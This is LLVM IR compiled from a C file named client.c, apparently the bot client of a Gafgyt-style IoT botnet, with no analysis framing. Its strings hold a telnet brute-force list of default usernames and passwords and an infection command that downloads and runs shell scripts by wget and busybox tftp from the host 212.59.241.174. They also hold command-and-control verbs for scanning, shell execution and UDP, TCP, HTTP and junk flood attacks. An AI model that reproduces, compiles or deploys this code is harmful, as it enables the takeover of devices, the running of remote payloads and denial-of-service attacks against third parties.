; ModuleID = 'client.c'
source_filename = "client.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.state_t.4 = type { i32, i8 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = dso_local global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = dso_local global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@usernames = dso_local global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@passwords = dso_local global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@pids = dso_local global i32* null, align 8
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@scanPid = dso_local global i32 0, align 4
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @encode(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 512, i1 false)
  br label %9

9:                                                ; preds = %47, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #11
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %50

15:                                               ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

16:                                               ; preds = %44, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %47

20:                                               ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %43

33:                                               ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %43

43:                                               ; preds = %33, %20
  br label %44

44:                                               ; preds = %43
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  br label %16, !llvm.loop !6

47:                                               ; preds = %16
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %9, !llvm.loop !8

50:                                               ; preds = %9
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %55 = call noalias align 16 i8* @strdup(i8* %54) #12
  store i8* %55, i8** %7, align 8
  %56 = load i8*, i8** %7, align 8
  ret i8* %56
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @strdup(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @decode(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 512, i1 false)
  br label %9

9:                                                ; preds = %47, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #11
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %50

15:                                               ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

16:                                               ; preds = %44, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %47

20:                                               ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %43

33:                                               ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %43

43:                                               ; preds = %33, %20
  br label %44

44:                                               ; preds = %43
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  br label %16, !llvm.loop !9

47:                                               ; preds = %16
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %9, !llvm.loop !10

50:                                               ; preds = %9
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %55 = call noalias align 16 i8* @strdup(i8* %54) #12
  store i8* %55, i8** %7, align 8
  %56 = load i8*, i8** %7, align 8
  ret i8* %56
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !11

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !12

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !13

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !14

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @zprintf(i8* %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
